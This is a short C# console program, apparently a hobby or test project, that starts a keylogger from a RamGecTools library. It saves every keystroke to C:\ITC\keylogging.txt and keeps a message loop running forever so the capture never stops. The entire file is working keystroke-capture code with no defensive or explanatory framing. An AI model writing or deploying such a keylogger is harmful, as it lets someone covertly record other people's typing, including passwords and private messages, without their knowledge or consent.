using RamGecTools;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyboardRecorder
{
    class Program
    {
        static void Main(string[] args)
        {
            KeyLogger kl = new KeyLogger("C:\\ITC\\keylogging.txt");
            while (true)
            {
                Application.DoEvents();
            }
        }
    }
}
